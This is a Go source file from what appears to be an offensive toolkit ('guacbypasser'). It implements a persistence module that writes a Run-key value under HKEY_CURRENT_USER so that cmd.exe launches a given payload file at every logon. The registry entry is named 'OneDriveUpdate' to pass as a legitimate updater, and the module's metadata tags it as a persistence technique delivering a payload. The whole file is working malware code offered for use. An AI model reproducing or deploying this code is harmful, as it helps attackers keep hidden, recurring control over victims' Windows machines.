package guacbypasser

import (
	"fmt"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

func w32_nt_persistence_hkcu(p string) (error, Informer) {
	inf := Informer{
		Name: "hkcuruner",
		Desc: "Gain persistence using HKEY_CURRENT_USER Run registry key",
		Id:   4,

		Type:   "Persistence",
		Module: "w32_nt_persistence_hkcu",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	// Get absolute path of payload file.
	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}

	// C:\Windows\System32\cmd.exe /k start `path`
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fPath)

	// Open key in `Software\Microsoft\Windows\CurrentVersion\Run`
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	defer wk32.Close()
	if err != nil {
		return err, inf
	}
	if err := wk32.SetStringValue("OneDriveUpdate", cmdN); err != nil {
		return err, inf
	}
	return nil, inf
}

// NewPersistenceHKCU return error if errors contains and Informer struct with data for informating about vulnerabilitie.
func NewPersistenceHKCU(p string) (error, Informer) { return w32_nt_persistence_hkcu(p) }
